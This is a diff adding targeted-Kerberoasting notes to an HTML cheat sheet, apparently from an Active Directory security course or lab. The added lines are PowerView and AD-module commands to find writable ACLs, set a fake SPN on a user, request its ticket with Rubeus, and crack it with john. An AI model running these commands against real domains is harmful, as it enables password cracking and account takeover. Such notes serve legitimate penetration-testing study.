@@ -70,6 +70,31 @@
 - With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
 - We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
 
+<b>::: ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView(dev)</b>
+
+PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+<b>::: USING Powerview(dev), SEE IF THE USER ALREADY HAS A SPN</b>
+
+PS> Get-DomainUser -Identity supportuser | select serviceprincipalname
+
+<b>::: USING ActiveDirectory MODULE</b>
+
+PS> Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+
+<b>::: SET A SPN FOR THE USER (must be unique for the domain)</b>
+
+PS> Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}
+
+<b>::: USING ActiveDirectory MODULE</b>
+
+PS> Set-ADUser -Identity support1user -ServicePrincipalNames@{Add='ops/whatever1'}
+
+<b>::: KERBEROAST THE USER</b>
+
+PS> Rubeus.exe kerberoast /outfile:targetedhashes.txt 
+PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
+
 </center>
 </body>
 </html>
